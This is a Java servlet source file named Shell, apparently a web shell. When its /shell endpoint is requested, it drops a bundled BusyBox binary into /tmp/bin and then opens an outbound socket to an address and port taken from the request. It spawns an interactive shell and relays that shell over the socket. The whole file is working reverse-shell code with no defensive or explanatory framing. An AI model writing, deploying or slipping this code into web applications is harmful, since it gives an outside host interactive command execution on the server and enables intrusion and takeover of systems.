import java.io.IOException;
import java.io.File;
import java.nio.file.Files;
import java.util.HashSet;
import java.nio.file.attribute.PosixFilePermission;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;

@WebServlet(name="Shell", value="/shell")
public class Shell extends HttpServlet {
  @Override
  public void doGet(HttpServletRequest request, HttpServletResponse response)
      throws IOException {
    try {
      response.setContentType("text/plain");

      File to = new File("/tmp/bin/busybox");
      if(!to.exists()) {
        new File("/tmp/bin").mkdir();
        response.getWriter().println("- Copying BusyBox to /tmp/bin");
        File from = new File(System.getProperty("user.dir") + "/WEB-INF/busybox");
        Files.copy(from.toPath(), to.toPath());
        HashSet<PosixFilePermission> perms = new HashSet<>();
        perms.add(PosixFilePermission.OWNER_READ);
        perms.add(PosixFilePermission.OWNER_WRITE);
        perms.add(PosixFilePermission.OWNER_EXECUTE);
        Files.setPosixFilePermissions(to.toPath(), perms);

        response.getWriter().println("- Installing BusyBox on /tmp/bin");
        ProcessBuilder pb = new ProcessBuilder("/tmp/bin/busybox", "--install", "-s", "/tmp/bin");
        pb.redirectErrorStream(true);
        Process proc = pb.start();
        proc.waitFor();

        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = reader.readLine()) != null) {
          sb.append(line + "\n");
        }
        String output = sb.toString();
        output += "\nBusyBox installer exit code: " + proc.exitValue();
        response.getWriter().println(output);
      }

      String[] parameters = request.getParameterValues("addr");
      if (parameters == null) throw new Exception("Missing IP address");
      String addr = parameters[0];

      int port = 8080;
      parameters = request.getParameterValues("port");
      if(parameters != null) port = Integer.parseInt(parameters[0]);
      
      Socket sock = new Socket(addr, port);

      ProcessBuilder pb = new ProcessBuilder("/tmp/bin/busybox", "sh", "-i");
      pb.environment().put("PATH", "/tmp/bin");
      pb.redirectErrorStream(true);
      Process proc = pb.start();

      Relay thread = new Relay(sock, proc);
      thread.start();

      response.getWriter().println("- Relaying...");
    } catch(Throwable t) {
      t.printStackTrace(response.getWriter());
    }
  }

  class Relay extends Thread {
    Socket s;
    Process p;
    InputStream pi, pe, si;
    OutputStream po, so;

    Relay(Socket sock, Process proc) throws IOException {
      s = sock;
      p = proc;
      pi = p.getInputStream();
      pe = p.getErrorStream();
      si = s.getInputStream();
      po = p.getOutputStream();
      so = s.getOutputStream();
    }

    public void run() {
      try {
        while (!s.isClosed()) {
          while (pi.available() > 0) so.write(pi.read());
          while (pe.available() > 0) so.write(pe.read());
          while (si.available() > 0) po.write(si.read());
          so.flush();
          po.flush();
          Thread.sleep(50);
          try {
            p.exitValue();
            break;
          } catch (Throwable e) {}
        }

        p.destroy();
        s.close();
      } catch (Throwable e) {}
    }
  }
}
